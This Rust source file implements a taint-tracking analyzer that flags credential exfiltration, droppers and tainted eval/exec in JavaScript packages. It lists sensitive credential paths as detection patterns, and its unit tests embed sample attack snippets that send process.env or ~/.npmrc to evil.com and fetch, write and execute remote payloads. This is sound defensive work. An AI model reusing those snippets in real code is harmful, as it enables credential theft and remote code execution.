use std::collections::HashMap;
use std::path::PathBuf;

use tree_sitter::{Node, Parser};

use crate::types::{Finding, FindingCategory, Severity};

use super::{truncate, Analyzer};

// ---------------------------------------------------------------------------
// Data flow analyzer — lightweight taint tracking for multi-step attacks
// ---------------------------------------------------------------------------

pub struct DataFlowAnalyzer;

/// Maximum file size to parse (1 MB).
const MAX_FILE_SIZE: usize = 1_024 * 1_024;

/// The kind of taint carried by a variable.
#[derive(Debug, Clone, PartialEq, Eq)]
enum TaintKind {
    /// Data from `process.env` or `JSON.stringify(process.env)`.
    EnvData,
    /// Contents read from a sensitive file (`.npmrc`, `.ssh`, etc.).
    Credentials,
    /// Data received from a network call (`fetch`, `http.get`, …).
    NetworkData,
    /// A reference to `child_process` or one of its methods.
    ProcessHandle,
}

/// A record of a taint source for diagnostic purposes.
#[derive(Debug, Clone)]
struct TaintEntry {
    kind: TaintKind,
    /// Source line number (retained for future diagnostic messages).
    #[allow(dead_code)]
    line: usize,
}

/// Tracks taint state for a single scope (file-level or function-level).
#[derive(Debug, Default)]
struct TaintState {
    /// variable name -> taint info
    vars: HashMap<String, TaintEntry>,
}

// ---------------------------------------------------------------------------
// Analyzer trait
// ---------------------------------------------------------------------------

impl Analyzer for DataFlowAnalyzer {
    fn analyze(
        &self,
        files: &[(PathBuf, String)],
        _package_json: &serde_json::Value,
    ) -> Vec<Finding> {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_javascript::LANGUAGE.into())
            .expect("failed to load JavaScript grammar");

        let mut findings = Vec::new();

        for (path, content) in files {
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if !matches!(ext, "js" | "cjs" | "mjs") {
                continue;
            }

            let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if file_name.contains(".min.") {
                continue;
            }

            let path_str = path.display().to_string();
            let path_lower = path_str.to_lowercase();
            if path_lower.contains("/dist/")
                || path_lower.contains("/bundle/")
                || path_lower.contains("/build/")
                || path_lower.contains("/umd/")
                || path_lower.contains("/cjs/")
                || path_lower.contains("/esm/")
                || path_lower.starts_with("dist/")
                || path_lower.starts_with("bundle/")
                || path_lower.starts_with("build/")
                || path_lower.starts_with("umd/")
                || path_lower.starts_with("cjs/")
                || path_lower.starts_with("esm/")
            {
                continue;
            }

            if content.len() > MAX_FILE_SIZE {
                continue;
            }

            let tree = match parser.parse(content, None) {
                Some(t) => t,
                None => continue,
            };

            let root = tree.root_node();
            analyze_scope(root, content, &path_str, &mut findings);
        }

        findings
    }
}

// ---------------------------------------------------------------------------
// Scope analysis — single pass over statements
// ---------------------------------------------------------------------------

/// Analyze a scope (program or function body) for taint flows.
fn analyze_scope(
    scope_node: Node,
    source: &str,
    file: &str,
    findings: &mut Vec<Finding>,
) {
    let mut state = TaintState::default();

    // Walk top-level children (statements) in order.
    let count = scope_node.child_count();
    for i in 0..count {
        if let Some(child) = scope_node.child(i) {
            process_statement(child, source, file, &mut state, findings);
        }
    }

    // Also recurse into function bodies for one level of depth.
    visit_functions(scope_node, source, file, findings);
}

/// Recurse into function declarations / arrow functions / function expressions
/// and analyze each body as its own scope.
fn visit_functions(
    node: Node,
    source: &str,
    file: &str,
    findings: &mut Vec<Finding>,
) {
    let count = node.child_count();
    for i in 0..count {
        if let Some(child) = node.child(i) {
            match child.kind() {
                "function_declaration" | "arrow_function" | "function_expression"
                | "method_definition" => {
                    if let Some(body) = child.child_by_field_name("body") {
                        analyze_scope(body, source, file, findings);
                    }
                }
                _ => {
                    // Keep looking deeper for nested functions — but only if
                    // this node is NOT itself a function (to avoid re-analyzing).
                    if !matches!(
                        child.kind(),
                        "function_declaration"
                            | "arrow_function"
                            | "function_expression"
                            | "method_definition"
                    ) {
                        visit_functions(child, source, file, findings);
                    }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Statement processing
// ---------------------------------------------------------------------------

fn process_statement(
    node: Node,
    source: &str,
    file: &str,
    state: &mut TaintState,
    findings: &mut Vec<Finding>,
) {
    match node.kind() {
        "variable_declaration" | "lexical_declaration" => {
            process_variable_decl(node, source, file, state, findings);
        }
        "expression_statement" => {
            if let Some(expr) = node.child_by_field_name("expression")
                .or_else(|| node.child(0))
            {
                check_sinks(expr, source, file, state, findings);
                // Also handle assignment expressions at statement level.
                if expr.kind() == "assignment_expression" {
                    process_assignment(expr, source, file, state, findings);
                }
            }
        }
        _ => {
            // Walk children for compound statements (if, for, try, etc.).
            let count = node.child_count();
            for i in 0..count {
                if let Some(child) = node.child(i) {
                    process_statement(child, source, file, state, findings);
                }
            }
        }
    }
}

/// Process `const x = ...`, `let x = ...`, `var x = ...`.
fn process_variable_decl(
    node: Node,
    source: &str,
    file: &str,
    state: &mut TaintState,
    findings: &mut Vec<Finding>,
) {
    let count = node.child_count();
    for i in 0..count {
        if let Some(declarator) = node.child(i) {
            if declarator.kind() != "variable_declarator" {
                continue;
            }
            let name_node = match declarator.child_by_field_name("name") {
                Some(n) => n,
                None => continue,
            };
            let var_name = node_text(name_node, source).to_string();

            let value_node = match declarator.child_by_field_name("value") {
                Some(v) => v,
                None => continue,
            };

            // Check if the RHS is a taint source.
            if let Some(taint) = classify_source(value_node, source) {
                state.vars.insert(
                    var_name.clone(),
                    TaintEntry {
                        kind: taint,
                        line: line_number(value_node),
                    },
                );
            }
            // Also check if the RHS references a tainted variable and propagate.
            else if let Some(taint) = propagate_taint(value_node, source, state) {
                state.vars.insert(
                    var_name.clone(),
                    TaintEntry {
                        kind: taint,
                        line: line_number(value_node),
                    },
                );
            }

            // The value itself might be a sink (e.g., `const x = fetch(url + tainted)`).
            check_sinks(value_node, source, file, state, findings);
        }
    }
}

/// Process `x = <expr>` assignment expressions.
fn process_assignment(
    node: Node,
    source: &str,
    file: &str,
    state: &mut TaintState,
    findings: &mut Vec<Finding>,
) {
    let left = match node.child_by_field_name("left") {
        Some(l) => l,
        None => return,
    };
    let right = match node.child_by_field_name("right") {
        Some(r) => r,
        None => return,
    };

    let var_name = node_text(left, source).to_string();

    if let Some(taint) = classify_source(right, source) {
        state.vars.insert(
            var_name,
            TaintEntry {
                kind: taint,
                line: line_number(right),
            },
        );
    } else if let Some(taint) = propagate_taint(right, source, state) {
        state.vars.insert(
            var_name,
            TaintEntry {
                kind: taint,
                line: line_number(right),
            },
        );
    }

    check_sinks(right, source, file, state, findings);
}

// ---------------------------------------------------------------------------
// Taint sources
// ---------------------------------------------------------------------------

/// Classify an expression node as a taint source (if it is one).
fn classify_source(node: Node, source: &str) -> Option<TaintKind> {
    let text = node_text(node, source);

    // process.env or JSON.stringify(process.env)
    if text.contains("process.env") {
        return Some(TaintKind::EnvData);
    }

    // require('child_process') or import('child_process')
    if text.contains("child_process") && (text.contains("require") || text.contains("import")) {
        return Some(TaintKind::ProcessHandle);
    }

    // fs.readFileSync / fs.readFile with sensitive paths
    if (text.contains("readFileSync") || text.contains("readFile")) && is_sensitive_read(text) {
        return Some(TaintKind::Credentials);
    }

    // fs.readFileSync / fs.readFile with any path containing home-dir sensitive files
    if (text.contains("readFileSync") || text.contains("readFile"))
        && (text.contains(".npmrc")
            || text.contains(".ssh")
            || text.contains(".aws")
            || text.contains(".env")
            || text.contains(".netrc")
            || text.contains(".git/config")
            || text.contains("/etc/passwd")
            || text.contains("/etc/shadow"))
    {
        return Some(TaintKind::Credentials);
    }

    // Network fetches
    if is_network_call_text(text) {
        return Some(TaintKind::NetworkData);
    }

    // Await expressions: unwrap and classify the inner expression
    if node.kind() == "await_expression" {
        let count = node.child_count();
        for i in 0..count {
            if let Some(child) = node.child(i) {
                if child.kind() != "await" {
                    if let Some(t) = classify_source(child, source) {
                        return Some(t);
                    }
                }
            }
        }
    }

    None
}

/// Check whether a readFileSync/readFile call text targets a sensitive path.
fn is_sensitive_read(text: &str) -> bool {
    let sensitive = [
        ".npmrc", ".ssh", ".aws", ".env", ".netrc", ".git/config",
        "/etc/passwd", "/etc/shadow", "credentials", ".gnupg",
    ];
    sensitive.iter().any(|s| text.contains(s))
}

/// Check whether text looks like a network call.
fn is_network_call_text(text: &str) -> bool {
    text.starts_with("fetch(")
        || text.starts_with("fetch (")
        || text.contains("http.get(")
        || text.contains("http.request(")
        || text.contains("https.get(")
        || text.contains("https.request(")
        || text.contains("axios(")
        || text.contains("axios.get(")
        || text.contains("axios.post(")
        || text.contains("got(")
        || text.contains("got.get(")
        || text.contains("request(")
        || text.contains("XMLHttpRequest")
}

// ---------------------------------------------------------------------------
// Taint propagation
// ---------------------------------------------------------------------------

/// If an expression references a tainted variable, return its taint kind.
fn propagate_taint(node: Node, source: &str, state: &TaintState) -> Option<TaintKind> {
    let text = node_text(node, source);

    // Direct variable reference.
    if node.kind() == "identifier" {
        if let Some(entry) = state.vars.get(text) {
            return Some(entry.kind.clone());
        }
    }

    // Check if any tainted variable name appears in this expression.
    for (var_name, entry) in &state.vars {
        if text.contains(var_name.as_str()) {
            return Some(entry.kind.clone());
        }
    }

    None
}

// ---------------------------------------------------------------------------
// Sink detection
// ---------------------------------------------------------------------------

/// Recursively check whether an expression (or any descendant) is a dangerous
/// sink that consumes tainted data.
fn check_sinks(
    node: Node,
    source: &str,
    file: &str,
    state: &TaintState,
    findings: &mut Vec<Finding>,
) {
    let text = node_text(node, source);

    if node.kind() == "call_expression" {
        let callee_text = node
            .child_by_field_name("function")
            .map(|c| node_text(c, source))
            .unwrap_or("");

        let args_text = node
            .child_by_field_name("arguments")
            .map(|a| node_text(a, source))
            .unwrap_or("");

        // --- Sink: network call with env/credential data => exfiltration ---
        if is_network_call_callee(callee_text) {
            // Check if any argument references tainted env/credential data.
            if let Some(taint) = find_taint_in_text(args_text, state) {
                match taint {
                    TaintKind::EnvData => {
                        findings.push(Finding {
                            severity: Severity::Critical,
                            category: FindingCategory::DataFlow,
                            title: "Data exfiltration: process.env sent over network"
                                .to_string(),
                            description:
                                "Environment variables are read, then sent via a network call \
                                 — classic credential exfiltration pattern"
                                    .to_string(),
                            file: Some(file.to_string()),
                            line: Some(line_number(node)),
                            snippet: Some(snippet_for(node, source)),
                        });
                    }
                    TaintKind::Credentials => {
                        findings.push(Finding {
                            severity: Severity::Critical,
                            category: FindingCategory::DataFlow,
                            title: "Credential theft: sensitive file sent over network"
                                .to_string(),
                            description:
                                "A sensitive file (e.g. .npmrc, .ssh) is read and then \
                                 transmitted over the network"
                                    .to_string(),
                            file: Some(file.to_string()),
                            line: Some(line_number(node)),
                            snippet: Some(snippet_for(node, source)),
                        });
                    }
                    _ => {}
                }
            }
            // Also check the full call text (URL might contain tainted var).
            else if let Some(TaintKind::EnvData | TaintKind::Credentials) = find_taint_in_text(text, state) {
                findings.push(Finding {
                    severity: Severity::Critical,
                    category: FindingCategory::DataFlow,
                    title: "Data exfiltration: tainted data in network URL"
                        .to_string(),
                    description:
                        "Tainted data (env vars or credentials) appears in a network \
                         call URL or body"
                            .to_string(),
                    file: Some(file.to_string()),
                    line: Some(line_number(node)),
                    snippet: Some(snippet_for(node, source)),
                });
            }
        }

        // --- Sink: eval / Function with tainted data ---
        if (callee_text == "eval" || callee_text == "Function")
            && find_taint_in_text(args_text, state).is_some()
        {
            findings.push(Finding {
                severity: Severity::Critical,
                category: FindingCategory::DataFlow,
                title: "Tainted data passed to eval/Function".to_string(),
                description:
                    "Data from an untrusted source flows into eval() or Function() \
                     — remote code execution risk"
                        .to_string(),
                file: Some(file.to_string()),
                line: Some(line_number(node)),
                snippet: Some(snippet_for(node, source)),
            });
        }

        // --- Sink: child_process exec/spawn with tainted args ---
        if is_exec_call(callee_text) {
            if let Some(taint) = find_taint_in_text(args_text, state) {
                let severity = match taint {
                    TaintKind::NetworkData => Severity::Critical,
                    _ => Severity::High,
                };
                findings.push(Finding {
                    severity,
                    category: FindingCategory::DataFlow,
                    title: "Tainted data passed to child_process execution".to_string(),
                    description: format!(
                        "Data tainted as {:?} flows into a process execution call — \
                         command injection risk",
                        taint
                    ),
                    file: Some(file.to_string()),
                    line: Some(line_number(node)),
                    snippet: Some(snippet_for(node, source)),
                });
            }
        }

        // --- Sink: fs.writeFileSync with network data (dropper step 2) ---
        if callee_text.contains("writeFileSync") || callee_text.contains("writeFile") {
            if let Some(TaintKind::NetworkData) = find_taint_in_text(args_text, state) {
                findings.push(Finding {
                    severity: Severity::High,
                    category: FindingCategory::DataFlow,
                    title: "Dropper: network data written to file".to_string(),
                    description:
                        "Data fetched from the network is written to a local file — \
                         potential dropper (download + write + execute)"
                            .to_string(),
                    file: Some(file.to_string()),
                    line: Some(line_number(node)),
                    snippet: Some(snippet_for(node, source)),
                });
            }
        }
    }

    // --- Pattern: tainted variable used near network context (proximity) ---
    // If a line references a credential-tainted variable AND a network call
    // in the same expression statement, flag it.
    if node.kind() == "expression_statement" {
        if let Some(TaintKind::Credentials) = find_taint_in_text(text, state) {
            if is_network_call_text(text) {
                findings.push(Finding {
                    severity: Severity::High,
                    category: FindingCategory::DataFlow,
                    title: "Credential data used near network context".to_string(),
                    description:
                        "A variable containing sensitive file data appears in the same \
                         statement as a network call"
                            .to_string(),
                    file: Some(file.to_string()),
                    line: Some(line_number(node)),
                    snippet: Some(snippet_for(node, source)),
                });
            }
        }
    }

    // Recurse into children (for nested calls).
    let count = node.child_count();
    for i in 0..count {
        if let Some(child) = node.child(i) {
            // Avoid re-processing the same call_expression.
            if child.kind() == "call_expression" && node.kind() == "call_expression" {
                continue;
            }
            check_sinks(child, source, file, state, findings);
        }
    }
}

/// Check if a callee looks like a network call.
fn is_network_call_callee(callee: &str) -> bool {
    callee == "fetch"
        || callee.ends_with(".get")
        || callee.ends_with(".post")
        || callee.ends_with(".put")
        || callee.ends_with(".request")
        || callee.contains("http.get")
        || callee.contains("http.request")
        || callee.contains("https.get")
        || callee.contains("https.request")
        || callee.contains("axios")
        || callee.contains("got")
        || callee == "request"
}

/// Check if a callee is a child_process execution method.
fn is_exec_call(callee: &str) -> bool {
    callee.contains("exec(")
        || callee.contains("execSync")
        || callee.contains("spawn")
        || callee.contains("spawnSync")
        || callee.contains("execFile")
        || callee.contains("execFileSync")
        || callee == "exec"
        || callee == "execSync"
        || callee == "spawn"
        || callee == "spawnSync"
}

/// Find the first taint kind referenced in a text fragment.
fn find_taint_in_text(text: &str, state: &TaintState) -> Option<TaintKind> {
    for (var_name, entry) in &state.vars {
        if text.contains(var_name.as_str()) {
            return Some(entry.kind.clone());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn node_text<'a>(node: Node, source: &'a str) -> &'a str {
    node.utf8_text(source.as_bytes()).unwrap_or("")
}

fn line_number(node: Node) -> usize {
    node.start_position().row + 1
}

fn snippet_for(node: Node, source: &str) -> String {
    truncate(node_text(node, source), 120)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze_js(code: &str) -> Vec<Finding> {
        let analyzer = DataFlowAnalyzer;
        let files = vec![(PathBuf::from("index.js"), code.to_string())];
        let pkg = serde_json::json!({});
        analyzer.analyze(&files, &pkg)
    }

    #[test]
    fn detects_env_exfiltration() {
        let code = r#"
const data = JSON.stringify(process.env);
const encoded = Buffer.from(data).toString('base64');
fetch('https://evil.com/?d=' + encoded);
"#;
        let findings = analyze_js(code);
        let exfil: Vec<_> = findings
            .iter()
            .filter(|f| f.category == FindingCategory::DataFlow)
            .collect();
        assert!(
            !exfil.is_empty(),
            "should detect env data exfiltration, got: {:?}",
            findings
        );
        assert!(
            exfil.iter().any(|f| f.severity == Severity::Critical),
            "env exfiltration should be CRITICAL"
        );
    }

    #[test]
    fn detects_dropper_pattern() {
        let code = r#"
const resp = fetch('https://evil.com/payload');
fs.writeFileSync('/tmp/payload', resp);
execSync('/tmp/payload');
"#;
        let findings = analyze_js(code);
        let dropper: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.category == FindingCategory::DataFlow
                    && (f.title.contains("Dropper") || f.title.contains("child_process"))
            })
            .collect();
        assert!(
            !dropper.is_empty(),
            "should detect dropper pattern, got: {:?}",
            findings
        );
    }

    #[test]
    fn detects_credential_theft() {
        let code = r#"
const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'));
fetch('https://evil.com/steal?d=' + npmrc);
"#;
        let findings = analyze_js(code);
        let cred: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.category == FindingCategory::DataFlow
                    && f.title.contains("Credential")
            })
            .collect();
        assert!(
            !cred.is_empty(),
            "should detect credential theft, got: {:?}",
            findings
        );
        assert!(
            cred.iter().any(|f| f.severity == Severity::Critical),
            "credential theft should be CRITICAL"
        );
    }

    #[test]
    fn detects_tainted_exec() {
        let code = r#"
const payload = fetch('https://evil.com/cmd');
exec(payload);
"#;
        let findings = analyze_js(code);
        let exec_findings: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.category == FindingCategory::DataFlow
                    && f.title.contains("child_process")
            })
            .collect();
        assert!(
            !exec_findings.is_empty(),
            "should detect tainted exec, got: {:?}",
            findings
        );
    }

    #[test]
    fn detects_tainted_eval() {
        let code = r#"
const code = fetch('https://evil.com/code');
eval(code);
"#;
        let findings = analyze_js(code);
        let eval_findings: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.category == FindingCategory::DataFlow && f.title.contains("eval")
            })
            .collect();
        assert!(
            !eval_findings.is_empty(),
            "should detect tainted eval, got: {:?}",
            findings
        );
    }

    #[test]
    fn no_false_positive_on_clean_code() {
        let code = r#"
const data = fs.readFileSync('README.md');
console.log(data);
"#;
        let findings = analyze_js(code);
        let dataflow: Vec<_> = findings
            .iter()
            .filter(|f| f.category == FindingCategory::DataFlow)
            .collect();
        assert!(
            dataflow.is_empty(),
            "should not flag clean code, got: {:?}",
            dataflow
        );
    }

    #[test]
    fn skips_non_js_files() {
        let analyzer = DataFlowAnalyzer;
        let files = vec![(
            PathBuf::from("script.ts"),
            "const d = process.env; fetch('http://evil.com/' + d);".to_string(),
        )];
        let pkg = serde_json::json!({});
        let findings = analyzer.analyze(&files, &pkg);
        assert!(findings.is_empty(), "should skip .ts files");
    }

    #[test]
    fn skips_dist_directory() {
        let analyzer = DataFlowAnalyzer;
        let files = vec![(
            PathBuf::from("dist/index.js"),
            "const d = process.env; fetch('http://evil.com/' + d);".to_string(),
        )];
        let pkg = serde_json::json!({});
        let findings = analyzer.analyze(&files, &pkg);
        assert!(findings.is_empty(), "should skip dist/ files");
    }

    #[test]
    fn detects_env_in_function_scope() {
        let code = r#"
function exfil() {
    const envData = process.env;
    fetch('https://evil.com/?d=' + envData);
}
"#;
        let findings = analyze_js(code);
        let dataflow: Vec<_> = findings
            .iter()
            .filter(|f| f.category == FindingCategory::DataFlow)
            .collect();
        assert!(
            !dataflow.is_empty(),
            "should detect exfiltration inside a function, got: {:?}",
            findings
        );
    }

    #[test]
    fn detects_dropper_with_await() {
        let code = r#"
const data = await fetch('https://evil.com/payload');
fs.writeFileSync('/tmp/p', data);
"#;
        let findings = analyze_js(code);
        let dropper: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.category == FindingCategory::DataFlow && f.title.contains("Dropper")
            })
            .collect();
        assert!(
            !dropper.is_empty(),
            "should detect dropper with await, got: {:?}",
            findings
        );
    }
}
